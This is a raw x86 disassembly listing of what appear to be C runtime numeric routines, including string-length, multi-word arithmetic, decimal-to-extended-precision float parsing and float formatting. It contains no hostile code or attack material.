00002F20  FF15BC561E00      call near [0x1e56bc]
00002F26  8BF0              mov esi,eax
00002F28  3BF7              cmp esi,edi
00002F2A  0F8471FFFFFF      jz near 0x2ea1
00002F30  8BC6              mov eax,esi
00002F32  E96CFFFFFF        jmp 0x2ea3
00002F37  8B542408          mov edx,[esp+0x8]
00002F3B  8B442404          mov eax,[esp+0x4]
00002F3F  85D2              test edx,edx
00002F41  56                push esi
00002F42  8D4AFF            lea ecx,[edx-0x1]
00002F45  740D              jz 0x2f54
00002F47  803800            cmp byte [eax],0x0
00002F4A  7408              jz 0x2f54
00002F4C  40                inc eax
00002F4D  8BF1              mov esi,ecx
00002F4F  49                dec ecx
00002F50  85F6              test esi,esi
00002F52  75F3              jnz 0x2f47
00002F54  803800            cmp byte [eax],0x0
00002F57  5E                pop esi
00002F58  7505              jnz 0x2f5f
00002F5A  2B442404          sub eax,[esp+0x4]
00002F5E  C3                ret
00002F5F  8BC2              mov eax,edx
00002F61  C3                ret
00002F62  8B542404          mov edx,[esp+0x4]
00002F66  56                push esi
00002F67  8B74240C          mov esi,[esp+0xc]
00002F6B  33C0              xor eax,eax
00002F6D  8D0C32            lea ecx,[edx+esi]
00002F70  3BCA              cmp ecx,edx
00002F72  7204              jc 0x2f78
00002F74  3BCE              cmp ecx,esi
00002F76  7303              jnc 0x2f7b
00002F78  6A01              push byte +0x1
00002F7A  58                pop eax
00002F7B  8B542410          mov edx,[esp+0x10]
00002F7F  5E                pop esi
00002F80  890A              mov [edx],ecx
00002F82  C3                ret
00002F83  56                push esi
00002F84  8B742408          mov esi,[esp+0x8]
00002F88  57                push edi
00002F89  8B7C2410          mov edi,[esp+0x10]
00002F8D  56                push esi
00002F8E  FF37              push dword [edi]
00002F90  FF36              push dword [esi]
00002F92  E8CBFFFFFF        call 0x2f62
00002F97  83C40C            add esp,byte +0xc
00002F9A  85C0              test eax,eax
00002F9C  7417              jz 0x2fb5
00002F9E  8D4604            lea eax,[esi+0x4]
00002FA1  50                push eax
00002FA2  6A01              push byte +0x1
00002FA4  FF30              push dword [eax]
00002FA6  E8B7FFFFFF        call 0x2f62
00002FAB  83C40C            add esp,byte +0xc
00002FAE  85C0              test eax,eax
00002FB0  7403              jz 0x2fb5
00002FB2  FF4608            inc dword [esi+0x8]
00002FB5  8D4604            lea eax,[esi+0x4]
00002FB8  50                push eax
00002FB9  FF7704            push dword [edi+0x4]
00002FBC  FF30              push dword [eax]
00002FBE  E89FFFFFFF        call 0x2f62
00002FC3  83C40C            add esp,byte +0xc
00002FC6  85C0              test eax,eax
00002FC8  7403              jz 0x2fcd
00002FCA  FF4608            inc dword [esi+0x8]
00002FCD  8D4608            lea eax,[esi+0x8]
00002FD0  50                push eax
00002FD1  FF7708            push dword [edi+0x8]
00002FD4  FF30              push dword [eax]
00002FD6  E887FFFFFF        call 0x2f62
00002FDB  83C40C            add esp,byte +0xc
00002FDE  5F                pop edi
00002FDF  5E                pop esi
00002FE0  C3                ret
00002FE1  8B442404          mov eax,[esp+0x4]
00002FE5  56                push esi
00002FE6  57                push edi
00002FE7  8B30              mov esi,[eax]
00002FE9  8B7804            mov edi,[eax+0x4]
00002FEC  8BCE              mov ecx,esi
00002FEE  03F6              add esi,esi
00002FF0  8930              mov [eax],esi
00002FF2  8D343F            lea esi,[edi+edi]
00002FF5  C1E91F            shr ecx,0x1f
00002FF8  0BF1              or esi,ecx
00002FFA  8B4808            mov ecx,[eax+0x8]
00002FFD  8BD7              mov edx,edi
00002FFF  897004            mov [eax+0x4],esi
00003002  C1EA1F            shr edx,0x1f
00003005  D1E1              shl ecx,1
00003007  0BCA              or ecx,edx
00003009  5F                pop edi
0000300A  894808            mov [eax+0x8],ecx
0000300D  5E                pop esi
0000300E  C3                ret
0000300F  8B442404          mov eax,[esp+0x4]
00003013  56                push esi
00003014  57                push edi
00003015  8B5008            mov edx,[eax+0x8]
00003018  8B4804            mov ecx,[eax+0x4]
0000301B  8BF2              mov esi,edx
0000301D  8BF9              mov edi,ecx
0000301F  C1E61F            shl esi,0x1f
00003022  D1E9              shr ecx,1
00003024  0BCE              or ecx,esi
00003026  894804            mov [eax+0x4],ecx
00003029  8B08              mov ecx,[eax]
0000302B  C1E71F            shl edi,0x1f
0000302E  D1E9              shr ecx,1
00003030  D1EA              shr edx,1
00003032  0BCF              or ecx,edi
00003034  5F                pop edi
00003035  895008            mov [eax+0x8],edx
00003038  8908              mov [eax],ecx
0000303A  5E                pop esi
0000303B  C3                ret
0000303C  55                push ebp
0000303D  8BEC              mov ebp,esp
0000303F  83EC10            sub esp,byte +0x10
00003042  8B450C            mov eax,[ebp+0xc]
00003045  53                push ebx
00003046  8B5D10            mov ebx,[ebp+0x10]
00003049  33D2              xor edx,edx
0000304B  3BC2              cmp eax,edx
0000304D  56                push esi
0000304E  C745FC4E400000    mov dword [ebp-0x4],0x404e
00003055  8913              mov [ebx],edx
00003057  895304            mov [ebx+0x4],edx
0000305A  895308            mov [ebx+0x8],edx
0000305D  7651              jna 0x30b0
0000305F  57                push edi
00003060  894510            mov [ebp+0x10],eax
00003063  8BF3              mov esi,ebx
00003065  8D7DF0            lea edi,[ebp-0x10]
00003068  A5                movsd
00003069  A5                movsd
0000306A  53                push ebx
0000306B  A5                movsd
0000306C  E870FFFFFF        call 0x2fe1
00003071  53                push ebx
00003072  E86AFFFFFF        call 0x2fe1
00003077  8D45F0            lea eax,[ebp-0x10]
0000307A  50                push eax
0000307B  53                push ebx
0000307C  E802FFFFFF        call 0x2f83
00003081  53                push ebx
00003082  E85AFFFFFF        call 0x2fe1
00003087  8B4508            mov eax,[ebp+0x8]
0000308A  8365F400          and dword [ebp-0xc],byte +0x0
0000308E  8365F800          and dword [ebp-0x8],byte +0x0
00003092  0FBE00            movsx eax,byte [eax]
00003095  8945F0            mov [ebp-0x10],eax
00003098  8D45F0            lea eax,[ebp-0x10]
0000309B  50                push eax
0000309C  53                push ebx
0000309D  E8E1FEFFFF        call 0x2f83
000030A2  83C41C            add esp,byte +0x1c
000030A5  FF4508            inc dword [ebp+0x8]
000030A8  FF4D10            dec dword [ebp+0x10]
000030AB  75B6              jnz 0x3063
000030AD  33D2              xor edx,edx
000030AF  5F                pop edi
000030B0  395308            cmp [ebx+0x8],edx
000030B3  7528              jnz 0x30dd
000030B5  8B4B04            mov ecx,[ebx+0x4]
000030B8  8BC1              mov eax,ecx
000030BA  C1E810            shr eax,0x10
000030BD  894308            mov [ebx+0x8],eax
000030C0  8B03              mov eax,[ebx]
000030C2  8BF0              mov esi,eax
000030C4  C1EE10            shr esi,0x10
000030C7  C1E110            shl ecx,0x10
000030CA  0BF1              or esi,ecx
000030CC  C1E010            shl eax,0x10
000030CF  8145FCF0FF0000    add dword [ebp-0x4],0xfff0
000030D6  897304            mov [ebx+0x4],esi
000030D9  8903              mov [ebx],eax
000030DB  EBD3              jmp short 0x30b0
000030DD  BE00800000        mov esi,0x8000
000030E2  857308            test [ebx+0x8],esi
000030E5  7510              jnz 0x30f7
000030E7  53                push ebx
000030E8  E8F4FEFFFF        call 0x2fe1
000030ED  8145FCFFFF0000    add dword [ebp-0x4],0xffff
000030F4  59                pop ecx
000030F5  EBEB              jmp short 0x30e2
000030F7  668B45FC          mov ax,[ebp-0x4]
000030FB  5E                pop esi
000030FC  6689430A          mov [ebx+0xa],ax
00003100  5B                pop ebx
00003101  C9                leave
00003102  C3                ret
00003103  55                push ebp
00003104  8BEC              mov ebp,esp
00003106  83EC5C            sub esp,byte +0x5c
00003109  53                push ebx
0000310A  56                push esi
0000310B  57                push edi
0000310C  8B7D10            mov edi,[ebp+0x10]
0000310F  8D45A4            lea eax,[ebp-0x5c]
00003112  6A01              push byte +0x1
00003114  8945F4            mov [ebp-0xc],eax
00003117  33C0              xor eax,eax
00003119  5A                pop edx
0000311A  8945D8            mov [ebp-0x28],eax
0000311D  8955E8            mov [ebp-0x18],edx
00003120  8945FC            mov [ebp-0x4],eax
00003123  8945F0            mov [ebp-0x10],eax
00003126  8945DC            mov [ebp-0x24],eax
00003129  8945E0            mov [ebp-0x20],eax
0000312C  8945D4            mov [ebp-0x2c],eax
0000312F  8945D0            mov [ebp-0x30],eax
00003132  8945E4            mov [ebp-0x1c],eax
00003135  8945F8            mov [ebp-0x8],eax
00003138  8945EC            mov [ebp-0x14],eax
0000313B  897D10            mov [ebp+0x10],edi
0000313E  8A0F              mov cl,[edi]
00003140  80F920            cmp cl,0x20
00003143  740F              jz 0x3154
00003145  80F909            cmp cl,0x9
00003148  740A              jz 0x3154
0000314A  80F90A            cmp cl,0xa
0000314D  7405              jz 0x3154
0000314F  80F90D            cmp cl,0xd
00003152  7503              jnz 0x3157
00003154  47                inc edi
00003155  EBE7              jmp short 0x313e
00003157  6A04              push byte +0x4
00003159  5E                pop esi
0000315A  8A1F              mov bl,[edi]
0000315C  47                inc edi
0000315D  83F80B            cmp eax,byte +0xb
00003160  0F8777020000      ja near 0x33dd
00003166  FF2485A4351E00    jmp near [eax*4+0x1e35a4]
0000316D  80FB31            cmp bl,0x31
00003170  7C0C              jl 0x317e
00003172  80FB39            cmp bl,0x39
00003175  7F07              jg 0x317e
00003177  6A03              push byte +0x3
00003179  E91D020000        jmp 0x339b
0000317E  3A1D40601E00      cmp bl,[0x1e6040]
00003184  7507              jnz 0x318d
00003186  6A05              push byte +0x5
00003188  E946020000        jmp 0x33d3
0000318D  0FBEC3            movsx eax,bl
00003190  83E82B            sub eax,byte +0x2b
00003193  741E              jz 0x31b3
00003195  48                dec eax
00003196  48                dec eax
00003197  740E              jz 0x31a7
00003199  83E803            sub eax,byte +0x3
0000319C  0F85D4020000      jnz near 0x3476
000031A2  E98F000000        jmp 0x3236
000031A7  6A02              push byte +0x2
000031A9  C745D800800000    mov dword [ebp-0x28],0x8000
000031B0  58                pop eax
000031B1  EBA7              jmp short 0x315a
000031B3  8365D800          and dword [ebp-0x28],byte +0x0
000031B7  6A02              push byte +0x2
000031B9  58                pop eax
000031BA  EB9E              jmp short 0x315a
000031BC  80FB31            cmp bl,0x31
000031BF  8955F0            mov [ebp-0x10],edx
000031C2  7C05              jl 0x31c9
000031C4  80FB39            cmp bl,0x39
000031C7  7EAE              jng 0x3177
000031C9  3A1D40601E00      cmp bl,[0x1e6040]
000031CF  0F84BC000000      jz near 0x3291
000031D5  80FB2B            cmp bl,0x2b
000031D8  7431              jz 0x320b
000031DA  80FB2D            cmp bl,0x2d
000031DD  742C              jz 0x320b
000031DF  80FB30            cmp bl,0x30
000031E2  7452              jz 0x3236
000031E4  80FB43            cmp bl,0x43
000031E7  0F8E89020000      jng near 0x3476
000031ED  80FB45            cmp bl,0x45
000031F0  7E12              jng 0x3204
000031F2  80FB63            cmp bl,0x63
000031F5  0F8E7B020000      jng near 0x3476
000031FB  80FB65            cmp bl,0x65
000031FE  0F8F72020000      jg near 0x3476
00003204  6A06              push byte +0x6
00003206  E9C8010000        jmp 0x33d3
0000320B  4F                dec edi
0000320C  6A0B              push byte +0xb
0000320E  E9C0010000        jmp 0x33d3
00003213  80FB31            cmp bl,0x31
00003216  7C09              jl 0x3221
00003218  80FB39            cmp bl,0x39
0000321B  0F8E56FFFFFF      jng near 0x3177
00003221  3A1D40601E00      cmp bl,[0x1e6040]
00003227  0F8459FFFFFF      jz near 0x3186
0000322D  80FB30            cmp bl,0x30
00003230  0F85B5010000      jnz near 0x33eb
00003236  8BC2              mov eax,edx
00003238  E91DFFFFFF        jmp 0x315a
0000323D  8955F0            mov [ebp-0x10],edx
00003240  39153C601E00      cmp [0x1e603c],edx
00003246  7E11              jng 0x3259
00003248  0FB6C3            movzx eax,bl
0000324B  56                push esi
0000324C  50                push eax
0000324D  E8CAECFFFF        call 0x1f1c
00003252  59                pop ecx
00003253  59                pop ecx
00003254  6A01              push byte +0x1
00003256  5A                pop edx
00003257  EB0E              jmp short 0x3267
00003259  8B0D48601E00      mov ecx,[0x1e6048]
0000325F  0FB6C3            movzx eax,bl
00003262  8A0441            mov al,[ecx+eax*2]
00003265  23C6              and eax,esi
00003267  85C0              test eax,eax
00003269  741E              jz 0x3289
0000326B  837DFC19          cmp dword [ebp-0x4],byte +0x19
0000326F  7310              jnc 0x3281
00003271  8B45F4            mov eax,[ebp-0xc]
00003274  FF45FC            inc dword [ebp-0x4]
00003277  80EB30            sub bl,0x30
0000327A  FF45F4            inc dword [ebp-0xc]
0000327D  8818              mov [eax],bl
0000327F  EB03              jmp short 0x3284
00003281  FF45F8            inc dword [ebp-0x8]
00003284  8A1F              mov bl,[edi]
00003286  47                inc edi
00003287  EBB7              jmp short 0x3240
00003289  3A1D40601E00      cmp bl,[0x1e6040]
0000328F  7567              jnz 0x32f8
00003291  8BC6              mov eax,esi
00003293  E9C2FEFFFF        jmp 0x315a
00003298  837DFC00          cmp dword [ebp-0x4],byte +0x0
0000329C  8955F0            mov [ebp-0x10],edx
0000329F  8955DC            mov [ebp-0x24],edx
000032A2  750D              jnz 0x32b1
000032A4  80FB30            cmp bl,0x30
000032A7  7508              jnz 0x32b1
000032A9  FF4DF8            dec dword [ebp-0x8]
000032AC  8A1F              mov bl,[edi]
000032AE  47                inc edi
000032AF  EBF3              jmp short 0x32a4
000032B1  39153C601E00      cmp [0x1e603c],edx
000032B7  7E11              jng 0x32ca
000032B9  0FB6C3            movzx eax,bl
000032BC  56                push esi
000032BD  50                push eax
000032BE  E859ECFFFF        call 0x1f1c
000032C3  59                pop ecx
000032C4  59                pop ecx
000032C5  6A01              push byte +0x1
000032C7  5A                pop edx
000032C8  EB0E              jmp short 0x32d8
000032CA  8B0D48601E00      mov ecx,[0x1e6048]
000032D0  0FB6C3            movzx eax,bl
000032D3  8A0441            mov al,[ecx+eax*2]
000032D6  23C6              and eax,esi
000032D8  85C0              test eax,eax
000032DA  741C              jz 0x32f8
000032DC  837DFC19          cmp dword [ebp-0x4],byte +0x19
000032E0  7311              jnc 0x32f3
000032E2  8B45F4            mov eax,[ebp-0xc]
000032E5  FF45FC            inc dword [ebp-0x4]
000032E8  80EB30            sub bl,0x30
000032EB  FF45F4            inc dword [ebp-0xc]
000032EE  FF4DF8            dec dword [ebp-0x8]
000032F1  8818              mov [eax],bl
000032F3  8A1F              mov bl,[edi]
000032F5  47                inc edi
000032F6  EBB9              jmp short 0x32b1
000032F8  80FB2B            cmp bl,0x2b
000032FB  0F840AFFFFFF      jz near 0x320b
00003301  80FB2D            cmp bl,0x2d
00003304  0F8401FFFFFF      jz near 0x320b
0000330A  E9D5FEFFFF        jmp 0x31e4
0000330F  39153C601E00      cmp [0x1e603c],edx
00003315  8955DC            mov [ebp-0x24],edx
00003318  7E11              jng 0x332b
0000331A  0FB6C3            movzx eax,bl
0000331D  56                push esi
0000331E  50                push eax
0000331F  E8F8EBFFFF        call 0x1f1c
00003324  59                pop ecx
00003325  59                pop ecx
00003326  6A01              push byte +0x1
00003328  5A                pop edx
00003329  EB0E              jmp short 0x3339
0000332B  8B0D48601E00      mov ecx,[0x1e6048]
00003331  0FB6C3            movzx eax,bl
00003334  8A0441            mov al,[ecx+eax*2]
00003337  23C6              and eax,esi
00003339  85C0              test eax,eax
0000333B  0F84AA000000      jz near 0x33eb
00003341  8BC6              mov eax,esi
00003343  EB57              jmp short 0x339c
00003345  8D4FFE            lea ecx,[edi-0x2]
00003348  80FB31            cmp bl,0x31
0000334B  894D10            mov [ebp+0x10],ecx
0000334E  7C05              jl 0x3355
00003350  80FB39            cmp bl,0x39
00003353  7E44              jng 0x3399
00003355  0FBEC3            movsx eax,bl
00003358  83E82B            sub eax,byte +0x2b
0000335B  7474              jz 0x33d1
0000335D  48                dec eax
0000335E  48                dec eax
0000335F  7464              jz 0x33c5
00003361  83E803            sub eax,byte +0x3
00003364  0F850F010000      jnz near 0x3479
0000336A  6A08              push byte +0x8
0000336C  EB65              jmp short 0x33d3
0000336E  8955E0            mov [ebp-0x20],edx
00003371  80FB30            cmp bl,0x30
00003374  7505              jnz 0x337b
00003376  8A1F              mov bl,[edi]
00003378  47                inc edi
00003379  EBF6              jmp short 0x3371
0000337B  80FB31            cmp bl,0x31
0000337E  0F8CF2000000      jl near 0x3476
00003384  80FB39            cmp bl,0x39
00003387  0F8FE9000000      jg near 0x3476
0000338D  EB0A              jmp short 0x3399
0000338F  80FB31            cmp bl,0x31
00003392  7C0E              jl 0x33a2
00003394  80FB39            cmp bl,0x39
00003397  7F09              jg 0x33a2
00003399  6A09              push byte +0x9
0000339B  58                pop eax
0000339C  4F                dec edi
0000339D  E9B8FDFFFF        jmp 0x315a
000033A2  80FB30            cmp bl,0x30
000033A5  7544              jnz 0x33eb
000033A7  EBC1              jmp short 0x336a
000033A9  837D2000          cmp dword [ebp+0x20],byte +0x0
000033AD  742A              jz 0x33d9
000033AF  0FBEC3            movsx eax,bl
000033B2  8D4FFF            lea ecx,[edi-0x1]
000033B5  83E82B            sub eax,byte +0x2b
000033B8  894D10            mov [ebp+0x10],ecx
000033BB  7414              jz 0x33d1
000033BD  48                dec eax
000033BE  48                dec eax
000033BF  0F85B4000000      jnz near 0x3479
000033C5  834DE8FF          or dword [ebp-0x18],byte -0x1
000033C9  6A07              push byte +0x7
000033CB  58                pop eax
000033CC  E989FDFFFF        jmp 0x315a
000033D1  6A07              push byte +0x7
000033D3  58                pop eax
000033D4  E981FDFFFF        jmp 0x315a
000033D9  6A0A              push byte +0xa
000033DB  4F                dec edi
000033DC  58                pop eax
000033DD  83F80A            cmp eax,byte +0xa
000033E0  0F8495000000      jz near 0x347b
000033E6  E96FFDFFFF        jmp 0x315a
000033EB  8B7D10            mov edi,[ebp+0x10]
000033EE  E988000000        jmp 0x347b
000033F3  C745E001000000    mov dword [ebp-0x20],0x1
000033FA  33F6              xor esi,esi
000033FC  833D3C601E0001    cmp dword [0x1e603c],byte +0x1
00003403  7E0F              jng 0x3414
00003405  0FB6C3            movzx eax,bl
00003408  6A04              push byte +0x4
0000340A  50                push eax
0000340B  E80CEBFFFF        call 0x1f1c
00003410  59                pop ecx
00003411  59                pop ecx
00003412  EB0F              jmp short 0x3423
00003414  8B0D48601E00      mov ecx,[0x1e6048]
0000341A  0FB6C3            movzx eax,bl
0000341D  8A0441            mov al,[ecx+eax*2]
00003420  83E004            and eax,byte +0x4
00003423  85C0              test eax,eax
00003425  741C              jz 0x3443
00003427  0FBECB            movsx ecx,bl
0000342A  8D04B6            lea eax,[esi+esi*4]
0000342D  8D7441D0          lea esi,[ecx+eax*2-0x30]
00003431  81FE50140000      cmp esi,0x1450
00003437  7F05              jg 0x343e
00003439  8A1F              mov bl,[edi]
0000343B  47                inc edi
0000343C  EBBE              jmp short 0x33fc
0000343E  BE51140000        mov esi,0x1451
00003443  8975E4            mov [ebp-0x1c],esi
00003446  833D3C601E0001    cmp dword [0x1e603c],byte +0x1
0000344D  7E0F              jng 0x345e
0000344F  0FB6C3            movzx eax,bl
00003452  6A04              push byte +0x4
00003454  50                push eax
00003455  E8C2EAFFFF        call 0x1f1c
0000345A  59                pop ecx
0000345B  59                pop ecx
0000345C  EB0F              jmp short 0x346d
0000345E  8B0D48601E00      mov ecx,[0x1e6048]
00003464  0FB6C3            movzx eax,bl
00003467  8A0441            mov al,[ecx+eax*2]
0000346A  83E004            and eax,byte +0x4
0000346D  85C0              test eax,eax
0000346F  7405              jz 0x3476
00003471  8A1F              mov bl,[edi]
00003473  47                inc edi
00003474  EBD0              jmp short 0x3446
00003476  4F                dec edi
00003477  EB02              jmp short 0x347b
00003479  8BF9              mov edi,ecx
0000347B  8B450C            mov eax,[ebp+0xc]
0000347E  837DF000          cmp dword [ebp-0x10],byte +0x0
00003482  8938              mov [eax],edi
00003484  0F84D9000000      jz near 0x3563
0000348A  6A18              push byte +0x18
0000348C  58                pop eax
0000348D  3945FC            cmp [ebp-0x4],eax
00003490  7615              jna 0x34a7
00003492  807DBB05          cmp byte [ebp-0x45],0x5
00003496  7C03              jl 0x349b
00003498  FE45BB            inc byte [ebp-0x45]
0000349B  8945FC            mov [ebp-0x4],eax
0000349E  8B45F4            mov eax,[ebp-0xc]
000034A1  48                dec eax
000034A2  FF45F8            inc dword [ebp-0x8]
000034A5  EB03              jmp short 0x34aa
000034A7  8B45F4            mov eax,[ebp-0xc]
000034AA  837DFC00          cmp dword [ebp-0x4],byte +0x0
000034AE  0F86A5000000      jna near 0x3559
000034B4  48                dec eax
000034B5  803800            cmp byte [eax],0x0
000034B8  7508              jnz 0x34c2
000034BA  FF4DFC            dec dword [ebp-0x4]
000034BD  FF45F8            inc dword [ebp-0x8]
000034C0  EBF2              jmp short 0x34b4
000034C2  8D45C0            lea eax,[ebp-0x40]
000034C5  50                push eax
000034C6  8D45A4            lea eax,[ebp-0x5c]
000034C9  FF75FC            push dword [ebp-0x4]
000034CC  50                push eax
000034CD  E86AFBFFFF        call 0x303c
000034D2  8B45E4            mov eax,[ebp-0x1c]
000034D5  33C9              xor ecx,ecx
000034D7  83C40C            add esp,byte +0xc
000034DA  394DE8            cmp [ebp-0x18],ecx
000034DD  7D02              jnl 0x34e1
000034DF  F7D8              neg eax
000034E1  0345F8            add eax,[ebp-0x8]
000034E4  394DE0            cmp [ebp-0x20],ecx
000034E7  7503              jnz 0x34ec
000034E9  034518            add eax,[ebp+0x18]
000034EC  394DDC            cmp [ebp-0x24],ecx
000034EF  7503              jnz 0x34f4
000034F1  2B451C            sub eax,[ebp+0x1c]
000034F4  3D50140000        cmp eax,0x1450
000034F9  7E30              jng 0x352b
000034FB  C745D401000000    mov dword [ebp-0x2c],0x1
00003502  8B5D10            mov ebx,[ebp+0x10]
00003505  8B7510            mov esi,[ebp+0x10]
00003508  8B4510            mov eax,[ebp+0x10]
0000350B  8B5510            mov edx,[ebp+0x10]
0000350E  837DD400          cmp dword [ebp-0x2c],byte +0x0
00003512  7460              jz 0x3574
00003514  33DB              xor ebx,ebx
00003516  B8FF7F0000        mov eax,0x7fff
0000351B  BE00000080        mov esi,0x80000000
00003520  33D2              xor edx,edx
00003522  C745EC02000000    mov dword [ebp-0x14],0x2
00003529  EB5E              jmp short 0x3589
0000352B  3DB0EBFFFF        cmp eax,0xffffebb0
00003530  7D09              jnl 0x353b
00003532  C745D001000000    mov dword [ebp-0x30],0x1
00003539  EBC7              jmp short 0x3502
0000353B  FF7514            push dword [ebp+0x14]
0000353E  50                push eax
0000353F  8D45C0            lea eax,[ebp-0x40]
00003542  50                push eax
00003543  E8B20E0000        call 0x43fa
00003548  8B55C0            mov edx,[ebp-0x40]
0000354B  8B5DC2            mov ebx,[ebp-0x3e]
0000354E  8B75C6            mov esi,[ebp-0x3a]
00003551  8B45CA            mov eax,[ebp-0x36]
00003554  83C40C            add esp,byte +0xc
00003557  EBB5              jmp short 0x350e
00003559  33D2              xor edx,edx
0000355B  33C0              xor eax,eax
0000355D  33F6              xor esi,esi
0000355F  33DB              xor ebx,ebx
00003561  EBAB              jmp short 0x350e
00003563  33D2              xor edx,edx
00003565  33C0              xor eax,eax
00003567  33F6              xor esi,esi
00003569  33DB              xor ebx,ebx
0000356B  C745EC04000000    mov dword [ebp-0x14],0x4
00003572  EB15              jmp short 0x3589
00003574  837DD000          cmp dword [ebp-0x30],byte +0x0
00003578  740F              jz 0x3589
0000357A  33D2              xor edx,edx
0000357C  33C0              xor eax,eax
0000357E  33F6              xor esi,esi
00003580  33DB              xor ebx,ebx
00003582  C745EC01000000    mov dword [ebp-0x14],0x1
00003589  8B4D08            mov ecx,[ebp+0x8]
0000358C  0B45D8            or eax,[ebp-0x28]
0000358F  5F                pop edi
00003590  897106            mov [ecx+0x6],esi
00003593  895902            mov [ecx+0x2],ebx
00003596  6689410A          mov [ecx+0xa],ax
0000359A  8B45EC            mov eax,[ebp-0x14]
0000359D  5E                pop esi
0000359E  668911            mov [ecx],dx
000035A1  5B                pop ebx
000035A2  C9                leave
000035A3  C3                ret
000035A4  6D                insd
000035A5  311E              xor [esi],ebx
000035A7  00BC311E001332    add [ecx+esi+0x3213001e],bh
000035AE  1E                push ds
000035AF  003D321E0098      add [0x98001e32],bh
000035B5  321E              xor bl,[esi]
000035B7  000F              add [edi],cl
000035B9  331E              xor ebx,[esi]
000035BB  004533            add [ebp+0x33],al
000035BE  1E                push ds
000035BF  008F331E006E      add [edi+0x6e001e33],cl
000035C5  331E              xor ebx,[esi]
000035C7  00F3              add bl,dh
000035C9  331E              xor ebx,[esi]
000035CB  00DD              add ch,bl
000035CD  331E              xor ebx,[esi]
000035CF  00A9331E0055      add [ecx+0x55001e33],ch
000035D5  8BEC              mov ebp,esp
000035D7  83EC1C            sub esp,byte +0x1c
000035DA  8B4510            mov eax,[ebp+0x10]
000035DD  53                push ebx
000035DE  8B5D1C            mov ebx,[ebp+0x1c]
000035E1  56                push esi
000035E2  8BC8              mov ecx,eax
000035E4  BEFF7F0000        mov esi,0x7fff
000035E9  81E100800000      and ecx,0x8000
000035EF  23C6              and eax,esi
000035F1  6685C9            test cx,cx
000035F4  57                push edi
000035F5  C645E4CC          mov byte [ebp-0x1c],0xcc
000035F9  C645E5CC          mov byte [ebp-0x1b],0xcc
000035FD  C645E6CC          mov byte [ebp-0x1a],0xcc
00003601  C645E7CC          mov byte [ebp-0x19],0xcc
00003605  C645E8CC          mov byte [ebp-0x18],0xcc
00003609  C645E9CC          mov byte [ebp-0x17],0xcc
0000360D  C645EACC          mov byte [ebp-0x16],0xcc
00003611  C645EBCC          mov byte [ebp-0x15],0xcc
00003615  C645ECCC          mov byte [ebp-0x14],0xcc
00003619  C645EDCC          mov byte [ebp-0x13],0xcc
0000361D  C645EEFB          mov byte [ebp-0x12],0xfb
00003621  C645EF3F          mov byte [ebp-0x11],0x3f
00003625  C745FC01000000    mov dword [ebp-0x4],0x1
0000362C  8BD0              mov edx,eax
0000362E  7406              jz 0x3636
00003630  C643022D          mov byte [ebx+0x2],0x2d
00003634  EB04              jmp short 0x363a
00003636  C6430220          mov byte [ebx+0x2],0x20
0000363A  8B7D0C            mov edi,[ebp+0xc]
0000363D  6685D2            test dx,dx
00003640  751E              jnz 0x3660
00003642  85FF              test edi,edi
00003644  751A              jnz 0x3660
00003646  397D08            cmp [ebp+0x8],edi
00003649  7515              jnz 0x3660
0000364B  66832300          and word [ebx],byte +0x0
0000364F  C6430220          mov byte [ebx+0x2],0x20
00003653  C6430301          mov byte [ebx+0x3],0x1
00003657  C6430430          mov byte [ebx+0x4],0x30
0000365B  E9FE010000        jmp 0x385e
00003660  663BD6            cmp dx,si
00003663  757A              jnz 0x36df
00003665  B800000080        mov eax,0x80000000
0000366A  66C7030100        mov word [ebx],0x1
0000366F  3BF8              cmp edi,eax
00003671  7506              jnz 0x3679
00003673  837D0800          cmp dword [ebp+0x8],byte +0x0
00003677  740F              jz 0x3688
00003679  F7C700000040      test edi,0x40000000
0000367F  7507              jnz 0x3688
00003681  68C0571E00        push dword 0x1e57c0
00003686  EB46              jmp short 0x36ce
00003688  6685C9            test cx,cx
0000368B  7415              jz 0x36a2
0000368D  81FF000000C0      cmp edi,0xc0000000
00003693  750D              jnz 0x36a2
00003695  837D0800          cmp dword [ebp+0x8],byte +0x0
00003699  752E              jnz 0x36c9
0000369B  68B8571E00        push dword 0x1e57b8
000036A0  EB0F              jmp short 0x36b1
000036A2  3BF8              cmp edi,eax
000036A4  7523              jnz 0x36c9
000036A6  837D0800          cmp dword [ebp+0x8],byte +0x0
000036AA  751D              jnz 0x36c9
000036AC  68B0571E00        push dword 0x1e57b0
000036B1  8D4304            lea eax,[ebx+0x4]
000036B4  50                push eax
000036B5  E886EFFFFF        call 0x2640
000036BA  59                pop ecx
000036BB  C6430305          mov byte [ebx+0x3],0x5
000036BF  59                pop ecx
000036C0  8365FC00          and dword [ebp-0x4],byte +0x0
000036C4  E96E010000        jmp 0x3837
000036C9  68A8571E00        push dword 0x1e57a8
000036CE  8D4304            lea eax,[ebx+0x4]
000036D1  50                push eax
000036D2  E869EFFFFF        call 0x2640
000036D7  59                pop ecx
000036D8  C6430306          mov byte [ebx+0x3],0x6
000036DC  59                pop ecx
000036DD  EBE1              jmp short 0x36c0
000036DF  0FB7C2            movzx eax,dx
000036E2  8BCF              mov ecx,edi
000036E4  8BF0              mov esi,eax
000036E6  C1E918            shr ecx,0x18
000036E9  69C0104D0000      imul eax,eax,dword 0x4d10
000036EF  C1EE08            shr esi,0x8
000036F2  668365F000        and word [ebp-0x10],byte +0x0
000036F7  6A01              push byte +0x1
000036F9  8D0C4E            lea ecx,[esi+ecx*2]
000036FC  668955FA          mov [ebp-0x6],dx
00003700  6BC94D            imul ecx,ecx,byte +0x4d
00003703  897DF6            mov [ebp-0xa],edi
00003706  8DB4010CEDBCEC    lea esi,[ecx+eax+0xecbced0c]
0000370D  8B4508            mov eax,[ebp+0x8]
00003710  C1FE10            sar esi,0x10
00003713  8945F2            mov [ebp-0xe],eax
00003716  0FBFC6            movsx eax,si
00003719  F7D8              neg eax
0000371B  50                push eax
0000371C  8D45F0            lea eax,[ebp-0x10]
0000371F  50                push eax
00003720  E8D50C0000        call 0x43fa
00003725  83C40C            add esp,byte +0xc
00003728  66817DFAFF3F      cmp word [ebp-0x6],0x3fff
0000372E  7210              jc 0x3740
00003730  8D45E4            lea eax,[ebp-0x1c]
00003733  46                inc esi
00003734  50                push eax
00003735  8D45F0            lea eax,[ebp-0x10]
00003738  50                push eax
00003739  E89C0A0000        call 0x41da
0000373E  59                pop ecx
0000373F  59                pop ecx
00003740  F6451801          test byte [ebp+0x18],0x1
00003744  668933            mov [ebx],si
00003747  7411              jz 0x375a
00003749  8B7D14            mov edi,[ebp+0x14]
0000374C  0FBFC6            movsx eax,si
0000374F  03F8              add edi,eax
00003751  85FF              test edi,edi
00003753  7F08              jg 0x375d
